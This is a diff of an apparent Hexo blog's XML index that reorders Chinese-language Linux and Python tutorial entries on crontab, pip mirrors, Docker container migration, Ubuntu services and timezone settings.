+        <content type="html"><![CDATA[<h3 id="Linux-crontab-命令"><a href="#Linux-crontab-命令" class="headerlink" title="Linux crontab 命令"></a>Linux crontab 命令</h3><p>Linux crontab是用来定期执行程序的命令。</p><p>crond 命令每分钟会定期检查是否有要执行的工作，如果有要执行的工作便会自动执行该工作。</p><p>注意：新创建的 cron 任务，不会马上执行，至少要过 2 分钟后才可以，当然你可以重启 cron 来马上执行。</p><pre><code>sudo service cron restart</code></pre><p>而 linux 任务调度的工作主要分为以下两类：</p><p>1、系统执行的工作：系统周期性所要执行的工作，如备份系统数据、清理缓存</p><p>2、个人执行的工作：某个用户定期要做的工作，例如每隔10分钟检查邮件服务器是否有新信，这些工作可由每个用户自行设置 </p><h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><pre><code># 第一种crontab [ -u user ] file# 第二种crontab [ -u user ] &#123; -l | -r | -e &#125;</code></pre><p>说明：</p><p>crontab 是用来让使用者在固定时间或固定间隔执行程序之用，换句话说，也就是类似使用者的时程表。</p><p>-u user 是指设定指定 user 的时程表，这个前提是你必须要有其权限(比如说是 root)才能够指定他人的时程表。如果不使用 -u user 的话，就是表示设定自己的时程表。</p><p>参数说明：</p><pre><code>-e : 执行文字编辑器来设定时程表，内定的文字编辑器是 VI，如果你想用别的文字编辑器，则请先设定 VISUAL 环境变数来指定使用那个文字编辑器(比如说 setenv VISUAL joe)-r : 删除目前的时程表-l : 列出目前的时程表</code></pre><p>时间格式如下：</p><p>f1 f2 f3 f4 f5 program</p><pre><code>其中 f1 是表示分钟，f2 表示小时，f3 表示一个月份中的第几日，f4 表示月份，f5 表示一个星期中的第几天。program 表示要执行的程序。当 f1 为 * 时表示每分钟都要执行 program，f2 为 * 时表示每小时都要执行程序当 f1 为 a-b 时表示从第 a 分钟到第 b 分钟这段时间内要执行，f2 为 a-b 时表示从第 a 到第 b 小时都要执行当 f1 为 */n 时表示每 n 分钟个时间间隔执行一次，f2 为 */n 表示每 n 小时个时间间隔执行一次当 f1 为 a, b, c,... 时表示第 a, b, c,... 分钟要执行，f2 为 a, b, c,... 时表示第 a, b, c...个小时要执行</code></pre><p>实例</p><p>（1）每月每天每小时的第 0 分钟执行一次 /bin/ls</p><pre><code>0 * * * * /bin/ls</code></pre><p>（2）在 12 月内, 每天的早上 6 点到 12 点，每隔 3 个小时 0 分钟执行一次 /usr/bin/backup</p><pre><code>0 6-12/3 * 12 * /usr/bin/backup</code></pre><p>（3）周一到周五每天下午 5:00 寄一封信给 <a href="mailto:&#97;&#x6c;&#x65;&#x78;&#x40;&#x64;&#111;&#109;&#x61;&#105;&#110;&#x2e;&#x6e;&#97;&#x6d;&#101;">&#97;&#x6c;&#x65;&#x78;&#x40;&#x64;&#111;&#109;&#x61;&#105;&#110;&#x2e;&#x6e;&#97;&#x6d;&#101;</a></p><pre><code>0 17 * * 1-5 mail -s &quot;hi&quot; alex@domain.name &lt; /tmp/maildata</code></pre><p>（4）每月每天的午夜 0 点 20 分, 2 点 20 分, 4 点 20 分….执行 echo “haha”</p><pre><code>20 0-23/2 * * * echo &quot;haha&quot;</code></pre><p>（5）每两个小时重启一次apache </p><pre><code>0 */2 * * * /sbin/service httpd restart</code></pre><p>（6）每天7：50开启ssh服务 </p><pre><code>50 7 * * * /sbin/service sshd start</code></pre><p>（7）每月1号和15号检查/home 磁盘 </p><pre><code>0 0 1,15 * * fsck /home</code></pre><p>（8）每周一至周五3点钟，在目录/home中，查找文件名为*.xxx的文件，并删除4天前的文件。</p><pre><code>00 03 * * 1-5 find /home &quot;*.xxx&quot; -mtime +4 -exec rm &#123;&#125; \; </code></pre>]]></content>
       
       
       <categories>
@@ -2323,31 +2323,6 @@
     
     
     <entry>
-      <title>pip 指定源安装</title>
-      <link href="2020/06/20/2020-06-20-pip_assigin_src_download/"/>
-      <url>2020/06/20/2020-06-20-pip_assigin_src_download/</url>
-      
-        <content type="html"><![CDATA[<p>指定源 参数 -i </p><p>阿里源</p><p>pip install -r requirements.txt -i <a href="https://mirrors.aliyun.com/pypi/simple/">https://mirrors.aliyun.com/pypi/simple/</a></p><p>豆瓣</p><p>pip install -r requirements.txt -i <a href="https://pypi.douban.com/simple/">https://pypi.douban.com/simple/</a></p><p>清华大学</p><p>pip install -r requirements.txt -i <a href="https://pypi.tuna.tsinghua.edu.cn/simple/">https://pypi.tuna.tsinghua.edu.cn/simple/</a></p>]]></content>
-      
-      
-      <categories>
-          
-          <category> python </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> pip </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
       <title>RuntimeError: cryptography is required for sha256_password or caching_sha2_password</title>
       <link href="2020/06/20/2020-06-20-mysql_sha256_password/"/>
       <url>2020/06/20/2020-06-20-mysql_sha256_password/</url>
@@ -2365,6 +2340,31 @@
         <tags>
             
             <tag> mysql </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>pip 指定源安装</title>
+      <link href="2020/06/20/2020-06-20-pip_assigin_src_download/"/>
+      <url>2020/06/20/2020-06-20-pip_assigin_src_download/</url>
+      
+        <content type="html"><![CDATA[<p>指定源 参数 -i </p><p>阿里源</p><p>pip install -r requirements.txt -i <a href="https://mirrors.aliyun.com/pypi/simple/">https://mirrors.aliyun.com/pypi/simple/</a></p><p>豆瓣</p><p>pip install -r requirements.txt -i <a href="https://pypi.douban.com/simple/">https://pypi.douban.com/simple/</a></p><p>清华大学</p><p>pip install -r requirements.txt -i <a href="https://pypi.tuna.tsinghua.edu.cn/simple/">https://pypi.tuna.tsinghua.edu.cn/simple/</a></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> python </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> pip </tag>
             
         </tags>
       
@@ -2558,7 +2558,7 @@
       <link href="2020/06/08/2020-06-08-migrate_docker_container_to_server/"/>
       <url>2020/06/08/2020-06-08-migrate_docker_container_to_server/</url>
       
-        <content type="html"><![CDATA[<h2 id="将本地docker容器迁移到服务端"><a href="#将本地docker容器迁移到服务端" class="headerlink" title="将本地docker容器迁移到服务端"></a>将本地docker容器迁移到服务端</h2><h3 id="从docker容器生成镜像"><a href="#从docker容器生成镜像" class="headerlink" title="从docker容器生成镜像"></a>从docker容器生成镜像</h3><pre><code>docker commit -a &quot;zhaoolee&quot; -m “完成uwsgi的配置” qs zhaoolee-qs:1.0</code></pre><p>参数说明: -a为作者署名, -m为本次提交的内容说明, qs为容器的名称, zhaoolee-qs:1.0表示新生成的镜像名为zhaoolee-qs,镜像zhaoolee-qs版本号为1.0</p><p>从容器生成镜像的时间可以会比较长, 需要耐心等待</p><h3 id="将docker镜像导出为静态文件"><a href="#将docker镜像导出为静态文件" class="headerlink" title="将docker镜像导出为静态文件"></a>将docker镜像导出为静态文件</h3><pre><code>docker save zhaoolee-qs:1.0 &gt; qs01.tar</code></pre><p>zhaoolee-qs:1.0为镜像名, qs01.tar为新生成的静态文件名</p><h3 id="通过将scp将静态文件发送到服务端"><a href="#通过将scp将静态文件发送到服务端" class="headerlink" title="通过将scp将静态文件发送到服务端"></a>通过将scp将静态文件发送到服务端</h3><pre><code>scp ./qs01.tar root@192.168.214.162:/qs01.tar   </code></pre><p>./qs01.tar 表示当前本地路径下的静态文件qs01.tar, <a href="mailto:&#114;&#111;&#x6f;&#x74;&#x40;&#x31;&#57;&#50;&#x2e;&#49;&#x36;&#x38;&#46;&#50;&#x31;&#52;&#46;&#x31;&#x36;&#50;">&#114;&#111;&#x6f;&#x74;&#x40;&#x31;&#57;&#50;&#x2e;&#49;&#x36;&#x38;&#46;&#50;&#x31;&#52;&#46;&#x31;&#x36;&#50;</a>表示以root的身份登录ip为192.168.214.162服务器, :/qs0.tar表示qs01.tar将要存储到远程服务器根目录下,文件名保持为qs01.tar</p><p>scp远程拷贝是一个非常值得掌握的命令, 简单实用, 也可用与脚本编程</p><h3 id="将静态文件还原为镜像-并导入docker"><a href="#将静态文件还原为镜像-并导入docker" class="headerlink" title="将静态文件还原为镜像, 并导入docker"></a>将静态文件还原为镜像, 并导入docker</h3><pre><code>docker load &lt; qs01.tar</code></pre><p>登录192.168.214.162, 进入根目录下(qs01.tar所在的位置), 运行此命令, 即可将镜像恢复, 并导入docker管理器</p><h3 id="从刚刚导入的镜像新建容器"><a href="#从刚刚导入的镜像新建容器" class="headerlink" title="从刚刚导入的镜像新建容器"></a>从刚刚导入的镜像新建容器</h3><pre><code>docker run -t -i --name qs01 -p 3000:80 -p 8000:8000 zhaoolee-qs:1.0 /bin/bash</code></pre><p>小技巧: 退出当前容器环境但不关闭当前容器ctrl+p+q</p>]]></content>
+        <content type="html"><![CDATA[<h2 id="将本地docker容器迁移到服务端"><a href="#将本地docker容器迁移到服务端" class="headerlink" title="将本地docker容器迁移到服务端"></a>将本地docker容器迁移到服务端</h2><h3 id="从docker容器生成镜像"><a href="#从docker容器生成镜像" class="headerlink" title="从docker容器生成镜像"></a>从docker容器生成镜像</h3><pre><code>docker commit -a &quot;zhaoolee&quot; -m “完成uwsgi的配置” qs zhaoolee-qs:1.0</code></pre><p>参数说明: -a为作者署名, -m为本次提交的内容说明, qs为容器的名称, zhaoolee-qs:1.0表示新生成的镜像名为zhaoolee-qs,镜像zhaoolee-qs版本号为1.0</p><p>从容器生成镜像的时间可以会比较长, 需要耐心等待</p><h3 id="将docker镜像导出为静态文件"><a href="#将docker镜像导出为静态文件" class="headerlink" title="将docker镜像导出为静态文件"></a>将docker镜像导出为静态文件</h3><pre><code>docker save zhaoolee-qs:1.0 &gt; qs01.tar</code></pre><p>zhaoolee-qs:1.0为镜像名, qs01.tar为新生成的静态文件名</p><h3 id="通过将scp将静态文件发送到服务端"><a href="#通过将scp将静态文件发送到服务端" class="headerlink" title="通过将scp将静态文件发送到服务端"></a>通过将scp将静态文件发送到服务端</h3><pre><code>scp ./qs01.tar root@192.168.214.162:/qs01.tar   </code></pre><p>./qs01.tar 表示当前本地路径下的静态文件qs01.tar, <a href="mailto:&#x72;&#x6f;&#x6f;&#116;&#64;&#x31;&#57;&#x32;&#46;&#x31;&#54;&#x38;&#x2e;&#50;&#x31;&#x34;&#x2e;&#49;&#54;&#50;">&#x72;&#x6f;&#x6f;&#116;&#64;&#x31;&#57;&#x32;&#46;&#x31;&#54;&#x38;&#x2e;&#50;&#x31;&#x34;&#x2e;&#49;&#54;&#50;</a>表示以root的身份登录ip为192.168.214.162服务器, :/qs0.tar表示qs01.tar将要存储到远程服务器根目录下,文件名保持为qs01.tar</p><p>scp远程拷贝是一个非常值得掌握的命令, 简单实用, 也可用与脚本编程</p><h3 id="将静态文件还原为镜像-并导入docker"><a href="#将静态文件还原为镜像-并导入docker" class="headerlink" title="将静态文件还原为镜像, 并导入docker"></a>将静态文件还原为镜像, 并导入docker</h3><pre><code>docker load &lt; qs01.tar</code></pre><p>登录192.168.214.162, 进入根目录下(qs01.tar所在的位置), 运行此命令, 即可将镜像恢复, 并导入docker管理器</p><h3 id="从刚刚导入的镜像新建容器"><a href="#从刚刚导入的镜像新建容器" class="headerlink" title="从刚刚导入的镜像新建容器"></a>从刚刚导入的镜像新建容器</h3><pre><code>docker run -t -i --name qs01 -p 3000:80 -p 8000:8000 zhaoolee-qs:1.0 /bin/bash</code></pre><p>小技巧: 退出当前容器环境但不关闭当前容器ctrl+p+q</p>]]></content>
       
       
       <categories>
@@ -3157,33 +3157,6 @@
     
     
     <entry>
-      <title>Bootstrap4 navbar fixed-top 固定导航栏遮盖下方元素</title>
-      <link href="2020/05/15/2020-05-19-Bootstrap-navbar-fixed-top/"/>
-      <url>2020/05/15/2020-05-19-Bootstrap-navbar-fixed-top/</url>
-      
-        <content type="html"><![CDATA[<h2 id="Bootstrap4-navbar-fixed-top-固定导航栏遮盖下方元素"><a href="#Bootstrap4-navbar-fixed-top-固定导航栏遮盖下方元素" class="headerlink" title="Bootstrap4 navbar fixed-top 固定导航栏遮盖下方元素"></a>Bootstrap4 navbar fixed-top 固定导航栏遮盖下方元素</h2><p>在Bootstrap4中，我们使用 .fixed-top 类来实现导航栏的固定：</p><pre><code>nav class=&quot;navbar navbar-expand-sm bg-dark navbar-dark fixed-top&quot;&gt;...&lt;/nav&gt;</code></pre><p>但这种方式会遮盖下方元素</p><p>两种解决方式：</p><p>（1）向<body>元素添加样式style=”padding-top: 50px;”，顶部填充的实际大小可自己调整。</p><p>（2）向div.nav-bar.fixed-top元素添加样式style=”position: sticky;”，实际是修改该导航栏元素的定位属性position，从原本的fixed到sticky。</p>]]></content>
-      
-      
-      <categories>
-          
-          <category> web开发 </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> web开发 </tag>
-            
-            <tag> bootstrap </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
       <title>Flask Web程序开发流程</title>
       <link href="2020/05/15/2020-05-15-flask_web_app_dev_process/"/>
       <url>2020/05/15/2020-05-15-flask_web_app_dev_process/</url>
@@ -3205,6 +3178,33 @@
             <tag> flask </tag>
             
             <tag> web </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Bootstrap4 navbar fixed-top 固定导航栏遮盖下方元素</title>
+      <link href="2020/05/15/2020-05-19-Bootstrap-navbar-fixed-top/"/>
+      <url>2020/05/15/2020-05-19-Bootstrap-navbar-fixed-top/</url>
+      
+        <content type="html"><![CDATA[<h2 id="Bootstrap4-navbar-fixed-top-固定导航栏遮盖下方元素"><a href="#Bootstrap4-navbar-fixed-top-固定导航栏遮盖下方元素" class="headerlink" title="Bootstrap4 navbar fixed-top 固定导航栏遮盖下方元素"></a>Bootstrap4 navbar fixed-top 固定导航栏遮盖下方元素</h2><p>在Bootstrap4中，我们使用 .fixed-top 类来实现导航栏的固定：</p><pre><code>nav class=&quot;navbar navbar-expand-sm bg-dark navbar-dark fixed-top&quot;&gt;...&lt;/nav&gt;</code></pre><p>但这种方式会遮盖下方元素</p><p>两种解决方式：</p><p>（1）向<body>元素添加样式style=”padding-top: 50px;”，顶部填充的实际大小可自己调整。</p><p>（2）向div.nav-bar.fixed-top元素添加样式style=”position: sticky;”，实际是修改该导航栏元素的定位属性position，从原本的fixed到sticky。</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> web开发 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> web开发 </tag>
+            
+            <tag> bootstrap </tag>
             
         </tags>
       
@@ -3595,11 +3595,11 @@
     
     
     <entry>
-      <title>Ubuntu将命令或脚本变成服务以及设置开机自启动</title>
-      <link href="2020/05/09/2020-05-09-ubuntu_self-bult_service/"/>
-      <url>2020/05/09/2020-05-09-ubuntu_self-bult_service/</url>
+      <title>ubuntu后台执行命令</title>
+      <link href="2020/05/09/2020-05-09-ubuntu_exec_background/"/>
+      <url>2020/05/09/2020-05-09-ubuntu_exec_background/</url>
       
-        <content type="html"><![CDATA[<h2 id="Ubuntu将命令或脚本变成服务以及设置开机自启动"><a href="#Ubuntu将命令或脚本变成服务以及设置开机自启动" class="headerlink" title="Ubuntu将命令或脚本变成服务以及设置开机自启动"></a>Ubuntu将命令或脚本变成服务以及设置开机自启动</h2><p>有很多程序比如ssh-tunnel、ftp、jekyll等网络服务，都是在前台执行监听的，必须一直保持进程连接才行，每次还要手动输入命令打开，不方便，也不稳定。</p><p>Linux的服务，其实就是自定义的shell脚本。需要做的主要就是把这个脚本以各种系统要求的格式或位置放好，然后用某个工具添加到服务中即可。</p><p>启动服务是用SERVICE +COMMAND。这里的command命令本身也是一个脚本。比如说：service networking start；中networking就是一个shell脚本。注意：这里的脚本没有文件后缀.sh。</p><h4 id="举个例子"><a href="#举个例子" class="headerlink" title="举个例子"></a>举个例子</h4><p>（1）把我们需要注册的脚本保存到/etc/init.d/目录中，例如jekyll本地部署脚本，命名为jekyll-deploy</p><pre><code>#!/bin/bashstart()&#123;    echo &quot;------------------test----------------&quot;    cd /home/mamba/Documents    jekyll s&#125;case $1 in    start):    start    ;;    stop):    echo &quot;-----------------stop------------------&quot;    ;;esacexit 0</code></pre><p>（2）设置权限</p><pre><code>chmod 755 /etc/init.d/jekyll-deploy</code></pre><p>（3）系统重新加载服务</p><pre><code>systemctl daemon-reload</code></pre><p>（4）利用service启动jekyll-deploy</p><pre><code>service jekyll-deploy restart</code></pre><h4 id="关于自定义脚本的编写"><a href="#关于自定义脚本的编写" class="headerlink" title="关于自定义脚本的编写"></a>关于自定义脚本的编写</h4><p>Linux的服务的本质是一个shell脚本，但是需要遵循service的标准模版，比如在头注释中编写service描述等，以供系统读取；还要定义每种操作的具体实行方式，比如在service start时会执行脚本中的start()函数。</p><p>以下为标准模版：</p><pre><code>#!/bin/bash## Fill in name of program here.PROG=&quot;myService&quot;PROG_PATH=&quot;/usr/local/myServer&quot; ## Not need, but sometimes helpful (if $PROG resides in /opt for example).PROG_ARGS=&quot;&quot; PID_PATH=&quot;/var/run/&quot;start() &#123;    if [ -e &quot;$PID_PATH/$PROG.pid&quot; ]; then        ## Program is running, exit with error.        echo &quot;Error! $PROG is currently running!&quot; 1&gt;&amp;2        exit 1    else        ## Change from /dev/null to something like /var/log/$PROG if you want to save output.        $PROG_PATH/$PROG $PROG_ARGS 2&gt;&amp;1 &gt;/var/log/$PROG &amp;    $pid=`ps ax | grep -i &#39;myService&#39; | sed &#39;s/^\([0-9]\&#123;1,\&#125;\).*/\1/g&#39; | head -n 1`        echo &quot;$PROG started&quot;        echo $pid &gt; &quot;$PID_PATH/$PROG.pid&quot;    fi&#125;stop() &#123;    echo &quot;begin stop&quot;    if [ -e &quot;$PID_PATH/$PROG.pid&quot; ]; then        ## Program is running, so stop it    pid=`ps ax | grep -i &#39;myService&#39; | sed &#39;s/^\([0-9]\&#123;1,\&#125;\).*/\1/g&#39; | head -n 1`    kill $pid        rm -f  &quot;$PID_PATH/$PROG.pid&quot;        echo &quot;$PROG stopped&quot;    else        ## Program is not running, exit with error.        echo &quot;Error! $PROG not started!&quot; 1&gt;&amp;2        exit 1    fi&#125;## Check to see if we are running as root first.## Found at http://www.cyberciti.biz/tips/shell-root-user-check-script.htmlif [ &quot;$(id -u)&quot; != &quot;0&quot; ]; then    echo &quot;This script must be run as root&quot; 1&gt;&amp;2    exit 1ficase &quot;$1&quot; in    start)        start        exit 0    ;;    stop)        stop        exit 0    ;;    reload|restart|force-reload)        stop        start        exit 0    ;;    **)        echo &quot;Usage: $0 &#123;start|stop|reload&#125;&quot; 1&gt;&amp;2        exit 1    ;;esac</code></pre><p>一般来讲，我们只用改写其中的几个变量，start 方法和 stop 方法。其中，PROG变量为所要运行的可执行程序的名称， PROG_PATH为可执行文件所在的目录，PROG_ARGS为执行程序的各个参数。</p><p>另设置服务开启启动等：</p><pre><code>systemctl is-enabled servicename.service #查询服务是否开机启动systemctl enable *.service #开机运行服务systemctl disable *.service #取消开机运行systemctl start *.service #启动服务systemctl stop *.service #停止服务systemctl restart *.service #重启服务systemctl reload *.service #重新加载服务配置文件systemctl status *.service #查询服务运行状态</code></pre>]]></content>
+        <content type="html"><![CDATA[<h2 id="ubuntu后台执行命令"><a href="#ubuntu后台执行命令" class="headerlink" title="ubuntu后台执行命令"></a>ubuntu后台执行命令</h2><ol><li>使用&amp;符号在后台执行命令</li></ol><p>你可以在Linux命令或者脚本后面增加&amp;符号，从而使命令或脚本在后台执行，例如：</p><pre><code>$ ./my-shell-script.sh &amp;  </code></pre><ol start="2"><li>使用nohup在后台执行命令</li></ol><p>使用&amp;符号在后台执行命令或脚本后，如果你退出登录，这个命令就会被自动终止掉。要避免这种情况，你可以使用nohup命令，如下所示：</p><pre><code>$ nohup ./my-shell-script.sh &amp;  </code></pre>]]></content>
       
       
       <categories>
@@ -3622,11 +3622,11 @@
     
     
     <entry>
-      <title>ubuntu后台执行命令</title>
-      <link href="2020/05/09/2020-05-09-ubuntu_exec_background/"/>
-      <url>2020/05/09/2020-05-09-ubuntu_exec_background/</url>
+      <title>Ubuntu将命令或脚本变成服务以及设置开机自启动</title>
+      <link href="2020/05/09/2020-05-09-ubuntu_self-bult_service/"/>
+      <url>2020/05/09/2020-05-09-ubuntu_self-bult_service/</url>
       
-        <content type="html"><![CDATA[<h2 id="ubuntu后台执行命令"><a href="#ubuntu后台执行命令" class="headerlink" title="ubuntu后台执行命令"></a>ubuntu后台执行命令</h2><ol><li>使用&amp;符号在后台执行命令</li></ol><p>你可以在Linux命令或者脚本后面增加&amp;符号，从而使命令或脚本在后台执行，例如：</p><pre><code>$ ./my-shell-script.sh &amp;  </code></pre><ol start="2"><li>使用nohup在后台执行命令</li></ol><p>使用&amp;符号在后台执行命令或脚本后，如果你退出登录，这个命令就会被自动终止掉。要避免这种情况，你可以使用nohup命令，如下所示：</p><pre><code>$ nohup ./my-shell-script.sh &amp;  </code></pre>]]></content>
+        <content type="html"><![CDATA[<h2 id="Ubuntu将命令或脚本变成服务以及设置开机自启动"><a href="#Ubuntu将命令或脚本变成服务以及设置开机自启动" class="headerlink" title="Ubuntu将命令或脚本变成服务以及设置开机自启动"></a>Ubuntu将命令或脚本变成服务以及设置开机自启动</h2><p>有很多程序比如ssh-tunnel、ftp、jekyll等网络服务，都是在前台执行监听的，必须一直保持进程连接才行，每次还要手动输入命令打开，不方便，也不稳定。</p><p>Linux的服务，其实就是自定义的shell脚本。需要做的主要就是把这个脚本以各种系统要求的格式或位置放好，然后用某个工具添加到服务中即可。</p><p>启动服务是用SERVICE +COMMAND。这里的command命令本身也是一个脚本。比如说：service networking start；中networking就是一个shell脚本。注意：这里的脚本没有文件后缀.sh。</p><h4 id="举个例子"><a href="#举个例子" class="headerlink" title="举个例子"></a>举个例子</h4><p>（1）把我们需要注册的脚本保存到/etc/init.d/目录中，例如jekyll本地部署脚本，命名为jekyll-deploy</p><pre><code>#!/bin/bashstart()&#123;    echo &quot;------------------test----------------&quot;    cd /home/mamba/Documents    jekyll s&#125;case $1 in    start):    start    ;;    stop):    echo &quot;-----------------stop------------------&quot;    ;;esacexit 0</code></pre><p>（2）设置权限</p><pre><code>chmod 755 /etc/init.d/jekyll-deploy</code></pre><p>（3）系统重新加载服务</p><pre><code>systemctl daemon-reload</code></pre><p>（4）利用service启动jekyll-deploy</p><pre><code>service jekyll-deploy restart</code></pre><h4 id="关于自定义脚本的编写"><a href="#关于自定义脚本的编写" class="headerlink" title="关于自定义脚本的编写"></a>关于自定义脚本的编写</h4><p>Linux的服务的本质是一个shell脚本，但是需要遵循service的标准模版，比如在头注释中编写service描述等，以供系统读取；还要定义每种操作的具体实行方式，比如在service start时会执行脚本中的start()函数。</p><p>以下为标准模版：</p><pre><code>#!/bin/bash## Fill in name of program here.PROG=&quot;myService&quot;PROG_PATH=&quot;/usr/local/myServer&quot; ## Not need, but sometimes helpful (if $PROG resides in /opt for example).PROG_ARGS=&quot;&quot; PID_PATH=&quot;/var/run/&quot;start() &#123;    if [ -e &quot;$PID_PATH/$PROG.pid&quot; ]; then        ## Program is running, exit with error.        echo &quot;Error! $PROG is currently running!&quot; 1&gt;&amp;2        exit 1    else        ## Change from /dev/null to something like /var/log/$PROG if you want to save output.        $PROG_PATH/$PROG $PROG_ARGS 2&gt;&amp;1 &gt;/var/log/$PROG &amp;    $pid=`ps ax | grep -i &#39;myService&#39; | sed &#39;s/^\([0-9]\&#123;1,\&#125;\).*/\1/g&#39; | head -n 1`        echo &quot;$PROG started&quot;        echo $pid &gt; &quot;$PID_PATH/$PROG.pid&quot;    fi&#125;stop() &#123;    echo &quot;begin stop&quot;    if [ -e &quot;$PID_PATH/$PROG.pid&quot; ]; then        ## Program is running, so stop it    pid=`ps ax | grep -i &#39;myService&#39; | sed &#39;s/^\([0-9]\&#123;1,\&#125;\).*/\1/g&#39; | head -n 1`    kill $pid        rm -f  &quot;$PID_PATH/$PROG.pid&quot;        echo &quot;$PROG stopped&quot;    else        ## Program is not running, exit with error.        echo &quot;Error! $PROG not started!&quot; 1&gt;&amp;2        exit 1    fi&#125;## Check to see if we are running as root first.## Found at http://www.cyberciti.biz/tips/shell-root-user-check-script.htmlif [ &quot;$(id -u)&quot; != &quot;0&quot; ]; then    echo &quot;This script must be run as root&quot; 1&gt;&amp;2    exit 1ficase &quot;$1&quot; in    start)        start        exit 0    ;;    stop)        stop        exit 0    ;;    reload|restart|force-reload)        stop        start        exit 0    ;;    **)        echo &quot;Usage: $0 &#123;start|stop|reload&#125;&quot; 1&gt;&amp;2        exit 1    ;;esac</code></pre><p>一般来讲，我们只用改写其中的几个变量，start 方法和 stop 方法。其中，PROG变量为所要运行的可执行程序的名称， PROG_PATH为可执行文件所在的目录，PROG_ARGS为执行程序的各个参数。</p><p>另设置服务开启启动等：</p><pre><code>systemctl is-enabled servicename.service #查询服务是否开机启动systemctl enable *.service #开机运行服务systemctl disable *.service #取消开机运行systemctl start *.service #启动服务systemctl stop *.service #停止服务systemctl restart *.service #重启服务systemctl reload *.service #重新加载服务配置文件systemctl status *.service #查询服务运行状态</code></pre>]]></content>
       
       
       <categories>
@@ -3846,33 +3846,6 @@
     
     
     <entry>
-      <title>Ubuntu 修改时区和更新时间</title>
-      <link href="2020/04/29/2020-04-29-ubuntu_modify_timezone_and_update_time/"/>
-      <url>2020/04/29/2020-04-29-ubuntu_modify_timezone_and_update_time/</url>
-      
-        <content type="html"><![CDATA[<h1 id="Ubuntu修改时区和更新时间"><a href="#Ubuntu修改时区和更新时间" class="headerlink" title="Ubuntu修改时区和更新时间"></a>Ubuntu修改时区和更新时间</h1><p>18.04之后一条命令解决</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">timedatectl set-timezone Asia&#x2F;Shanghai</span><br></pre></td></tr></table></figure><p>另一种方法比较复杂：</p><p>查看当前系统时间</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:&#x2F;# date -R   </span><br></pre></td></tr></table></figure><p>需要改成东八区，这儿显示不是，所以需要设置一个时区</p><p>1.运行tzselect</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:&#x2F;# tzselect</span><br></pre></td></tr></table></figure><p>在这里我们选择亚洲 Asia，确认之后选择中国（China)，最后选择北京(Beijing)</p><p>2.复制文件到/etc目录下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:&#x2F;# cp &#x2F;usr&#x2F;share&#x2F;zoneinfo&#x2F;Asia&#x2F;Shanghai  &#x2F;etc&#x2F;localtime</span><br></pre></td></tr></table></figure><p>3.再次查看时间date -R，已经修改为北京时间</p>]]></content>
-      
-      
-      <categories>
-          
-          <category> linux </category>
-          
-          <category> ubuntu </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> ubuntu </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
       <title>linux压缩和解压缩命令</title>
       <link href="2020/04/29/2020-04-29-linux_compression_and_decompression_commands/"/>
       <url>2020/04/29/2020-04-29-linux_compression_and_decompression_commands/</url>
@@ -3896,6 +3869,33 @@
             <tag> shell </tag>
             
             <tag> tar </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Ubuntu 修改时区和更新时间</title>
+      <link href="2020/04/29/2020-04-29-ubuntu_modify_timezone_and_update_time/"/>
+      <url>2020/04/29/2020-04-29-ubuntu_modify_timezone_and_update_time/</url>
+      
+        <content type="html"><![CDATA[<h1 id="Ubuntu修改时区和更新时间"><a href="#Ubuntu修改时区和更新时间" class="headerlink" title="Ubuntu修改时区和更新时间"></a>Ubuntu修改时区和更新时间</h1><p>18.04之后一条命令解决</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">timedatectl set-timezone Asia&#x2F;Shanghai</span><br></pre></td></tr></table></figure><p>另一种方法比较复杂：</p><p>查看当前系统时间</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:&#x2F;# date -R   </span><br></pre></td></tr></table></figure><p>需要改成东八区，这儿显示不是，所以需要设置一个时区</p><p>1.运行tzselect</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:&#x2F;# tzselect</span><br></pre></td></tr></table></figure><p>在这里我们选择亚洲 Asia，确认之后选择中国（China)，最后选择北京(Beijing)</p><p>2.复制文件到/etc目录下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:&#x2F;# cp &#x2F;usr&#x2F;share&#x2F;zoneinfo&#x2F;Asia&#x2F;Shanghai  &#x2F;etc&#x2F;localtime</span><br></pre></td></tr></table></figure><p>3.再次查看时间date -R，已经修改为北京时间</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> linux </category>
+          
+          <category> ubuntu </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> ubuntu </tag>
             
         </tags>
       
@@ -4174,31 +4174,6 @@
     
     
     <entry>
-      <title>github 删除文件夹</title>
-      <link href="2020/04/22/2020-04-22-github_delete_folder/"/>
-      <url>2020/04/22/2020-04-22-github_delete_folder/</url>
-      
